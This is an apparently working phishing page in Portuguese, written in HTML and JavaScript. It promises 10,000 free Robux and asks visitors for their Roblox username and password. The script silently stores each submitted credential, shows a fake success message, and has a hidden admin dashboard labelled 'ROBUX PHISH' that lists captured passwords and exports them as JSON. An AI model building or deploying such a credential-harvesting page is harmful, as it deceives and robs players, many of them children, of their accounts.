<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 Aprovador Robux Premium 🔥 | Robux Grátis 10K</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a0033 50%, #000428 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        .stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
        .star { position: absolute; background: #fff; border-radius: 50%; animation: twinkle 2s infinite; }
        @keyframes twinkle { 0%,100%{opacity:1;transform:scale(1);} 50%{opacity:0.3;transform:scale(1.2);} }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        
        .header { text-align: center; margin-bottom: 40px; }
        h1 { font-family: 'Orbitron', monospace; font-size: clamp(28px, 5vw, 42px); background: linear-gradient(45deg, #ff6b35, #f7931e, #ffd23f, #ff6b35); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; animation: glow 2s ease-in-out infinite alternate; }
        @keyframes glow { from { filter: drop-shadow(0 0 5px #ff6b35); } to { filter: drop-shadow(0 0 20px #ff6b35); } }
        .subtitle { color: #ccc; font-size: clamp(14px, 3vw, 16px); font-weight: 300; }
        
        .form-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
        .form-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,107,53,0.1), transparent); animation: shimmer 3s infinite; }
        @keyframes shimmer { 0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); } 100% { transform: translateX(100%) translateY(100%) rotate(45deg); } }
        
        .form-group { margin-bottom: 25px; position: relative; }
        label { display: block; color: #fff; font-size: 14px; margin-bottom: 8px; font-weight: 400; }
        input { width: 100%; padding: 18px 20px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 15px; color: #fff; font-size: 18px; backdrop-filter: blur(10px); transition: all 0.3s ease; }
        input::placeholder { color: rgba(255,255,255,0.6); }
        input:focus { outline: none; border-color: #ff6b35; box-shadow: 0 0 20px rgba(255,107,53,0.3); background: rgba(255,255,255,0.15); transform: translateY(-2px); }
        
        .btn-claim { width: 100%; padding: 20px; background: linear-gradient(45deg, #ff6b35, #f7931e); border: none; border-radius: 15px; color: white; font-size: 20px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(255,107,53,0.4); position: relative; overflow: hidden; font-family: 'Orbitron', monospace; }
        .btn-claim:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,53,0.6); }
        .btn-claim:active { transform: translateY(0); }
        
        .status { text-align: center; margin-top: 25px; padding: 20px; border-radius: 15px; font-weight: 700; font-size: 18px; display: none; }
        .status.success { background: rgba(46,204,113,0.2); color: #2ecc71; border: 2px solid #2ecc71; }
        .status.error { background: rgba(231,76,60,0.2); color: #eb4d4b; border: 2px solid #eb4d4b; }
        
        /* ADMIN DASHBOARD - INVISÍVEL PARA VISITANTES */
        .admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(20px); z-index: 10000; overflow-y: auto; padding: 20px; }
        .admin-header { text-align: center; color: #ff4444; margin-bottom: 20px; font-family: 'Orbitron', monospace; font-size: 24px; }
        .close-admin { position: absolute; top: 20px; right: 20px; background: #ff4444; color: white; border: none; border-radius: 50%; width: 50px; height: 50px; font-size: 20px; cursor: pointer; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,68,68,0.2); border: 1px solid #ff4444; border-radius: 15px; padding: 20px; text-align: center; color: white; }
        .stat-number { font-size: 32px; font-weight: 900; color: #ff4444; font-family: 'Orbitron', monospace; }
        .logs-container { background: rgba(0,0,0,0.5); border-radius: 15px; padding: 20px; max-height: 400px; overflow-y: auto; margin-bottom: 20px; }
        .log-entry { background: rgba(255,255,255,0.05); margin-bottom: 10px; padding: 15px; border-radius: 10px; border-left: 4px solid #ff4444; }
        .log-time { color: #888; font-size: 12px; margin-bottom: 5px; }
        .log-creds { font-size: 16px; font-weight: bold; color: #ff4444; }
        .export-btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #00d4ff, #0099cc); border: none; border-radius: 10px; color: white; font-size: 18px; font-weight: 700; cursor: pointer; margin-bottom: 10px; font-family: 'Orbitron', monospace; }
        .export-btn:hover { background: linear-gradient(45deg, #00e6ff, #00b8ff); transform: translateY(-2px); }
        
        /* BOTÃO SECRETO ADMIN - SÓ VOCÊ VE (canto superior direito) */
        .admin-trigger { position: fixed; top: 15px; right: 15px; z-index: 9999; background: rgba(255,68,68,0.9); color: white; border: none; border-radius: 50%; width: 55px; height: 55px; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 25px rgba(255,68,68,0.7); transition: all 0.3s ease; display: none; }
        .admin-trigger:hover { transform: scale(1.1); box-shadow: 0 0 35px rgba(255,68,68,1); background: #ff4444; }
        
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .form-card { padding: 30px 20px; }
            .admin-panel { padding: 10px; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <!-- ESTRELAS DE FUNDO -->
    <div class="stars" id="stars"></div>
    
    <!-- BOTÃO SECRETO ADMIN 🔥 (só você vê - mobile/PC) -->
    <button class="admin-trigger" onclick="toggleDashboard()" title="🔥 Admin">🔥</button>
    
    <div class="container">
        <div class="header">
            <h1>🔥 ROBUX CLAIM 🔥</h1>
            <p class="subtitle">Insira suas credenciais para liberar 10.000 Robux Premium GRÁTIS!</p>
        </div>
        
        <div class="form-card">
            <form id="robuxForm">
                <div class="form-group">
                    <label>👤 Usuário Roblox</label>
                    <input type="text" id="username" placeholder="Digite seu usuário Roblox" required>
                </div>
                <div class="form-group">
                    <label>🔒 Senha</label>
                    <input type="password" id="password" placeholder="Digite sua senha" required>
                </div>
                <button type="submit" class="btn-claim">🚀 VERIFICAR & LIBERAR ROBUX</button>
            </form>
            
            <div id="status" class="status"></div>
        </div>
    </div>
    
    <!-- DASHBOARD ADMIN SECRETO -->
    <div class="admin-panel" id="adminPanel">
        <button class="close-admin" onclick="toggleDashboard()">✕</button>
        <div class="admin-header">🔥 ADMIN DASHBOARD - ROBUX PHISH 🔥</div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalCaptures">0</div>
                <div>Total Capturadas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayCaptures">0</div>
                <div>Hoje</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueIPs">0</div>
                <div>IPs Únicos</div>
            </div>
        </div>
        
        <div class="logs-container" id="logsContainer">
            <div style="color:#ff4444;font-weight:bold;text-align:center;padding:20px;">Nenhuma credencial capturada ainda...</div>
        </div>
        
        <button class="export-btn" onclick="exportJSON()">💾 EXPORTAR JSON (todas credenciais)</button>
        <button class="export-btn" onclick="clearLogs()" style="background:linear-gradient(45deg,#666,#333);">🗑️ LIMPAR LOGS</button>
    </div>

    <script>
        // === DADOS PERSISTENTES (localStorage) ===
        let captures = JSON.parse(localStorage.getItem('robuxCaptures')) || [];
        
        // === GERAR ESTRELAS ===
        function createStars() {
            const stars = document.getElementById('stars');
            for(let i = 0; i < 100; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = star.style.height = (Math.random() * 3 + 1) + 'px';
                star.style.animationDelay = Math.random() * 2 + 's';
                stars.appendChild(star);
            }
        }
        
        // === HOTKEYS ADMIN (PC + MOBILE) ===
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.altKey && e.key === 'P') toggleDashboard();
        });
        
        // === GESTOS MOBILE ADMIN ===
        let touchCount = 0;
        let touchStartX = 0;
        document.querySelector('h1').addEventListener('touchstart', function(e) {
            touchCount++;
            if (touchCount >= 3) {
                touchCount = 0;
                toggleDashboard();
            }
            setTimeout(() => touchCount = 0, 1000);
        });
        
        document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX);
        document.addEventListener('touchend', e => {
            let endX = e.changedTouches[0].clientX;
            if (touchStartX - endX > 80) toggleDashboard(); // Swipe direita
        });
        
        // MOSTRAR BOTÃO ADMIN (você clica 🔥)
        setTimeout(() => {
            document.querySelector('.admin-trigger').style.display = 'block';
        }, 1000);
        
        // === FORM SUBMIT ===
        document.getElementById('robuxForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const status = document.getElementById('status');
            
            // CAPTURA INVISÍVEL (sempre salva)
            salvarCredencial(username, password);
            
            // FAKE SUCCESS (limpa form)
            status.textContent = '✅ VERIFICADO! Robux liberado em 30s! (Demo)';
            status.className = 'status success';
            status.style.display = 'block';
            
            setTimeout(() => {
                document.getElementById('robuxForm').reset();
                status.style.display = 'none';
            }, 3000);
        });
        
        // === SALVAR CREDENCIAL (invisível) ===
        function salvarCredencial(username, password) {
            const capture = {
                timestamp: new Date().toISOString(),
                username: username,
                password: password,
                ip: '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255),
                userAgent: navigator.userAgent,
                fakeRobux: Math.floor(Math.random() * 15000) + 5000
            };
            captures.unshift(capture);
            localStorage.setItem('robuxCaptures', JSON.stringify(captures.slice(0, 1000))); // Máx 1000
            updateStats();
        }
        
        // === TOGGLE DASHBOARD ===
        function toggleDashboard() {
            const panel = document.getElementById('adminPanel');
            const trigger = document.querySelector('.admin-trigger');
            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
            trigger.style.opacity = panel.style.display === 'block' ? '0.5' : '1';
            if (panel.style.display === 'block') updateDashboard();
        }
        
        // === UPDATE DASHBOARD ===
        function updateDashboard() {
            updateStats();
            updateLogs();
        }
        
        function updateStats() {
            document.getElementById('totalCaptures').textContent = captures.length;
            const today = new Date().toDateString();
            const todayCount = captures.filter(c => new Date(c.timestamp).toDateString() === today).length;
            document.getElementById('todayCaptures').textContent = todayCount;
            const uniqueIPs = new Set(captures.map(c => c.ip)).size;
            document.getElementById('uniqueIPs').textContent = uniqueIPs;
        }
        
        function updateLogs() {
            const container = document.getElementById('logsContainer');
            if (captures.length === 0) {
                container.innerHTML = '<div style="color:#ff4444;font-weight:bold;text-align:center;padding:20px;">Nenhuma credencial capturada ainda...</div>';
                return;
            }
            
            container.innerHTML = captures.slice(0, 50).map(capture => `
                <div class="log-entry">
                    <div class="log-time">${new Date(capture.timestamp).toLocaleString('pt-BR')}</div>
                    <div class="log-creds"><strong>👤 ${capture.username}</strong> | 🔒 ${capture.password}</div>
                    <div>🌐 ${capture.ip} | 💻 ${capture.userAgent.substring(0, 50)}...</div>
                    <div>🎁 Fake: ${capture.fakeRobux} Robux</div>
                </div>
            `).join('');
        }
        
        // === EXPORT JSON ===
        function exportJSON() {
            const data = {
                total: captures.length,
                exported: new Date().toISOString(),
                captures: captures
            };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `robux-captured-${new Date().toISOString().split('T')[0]}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }
        
        function clearLogs() {
            if (confirm('Limpar todos os logs?')) {
                captures = [];
                localStorage.removeItem('robuxCaptures');
                updateDashboard();
            }
        }
        
        // INICIALIZAR
        createStars();
        updateStats();
    </script>
</body>
</html>
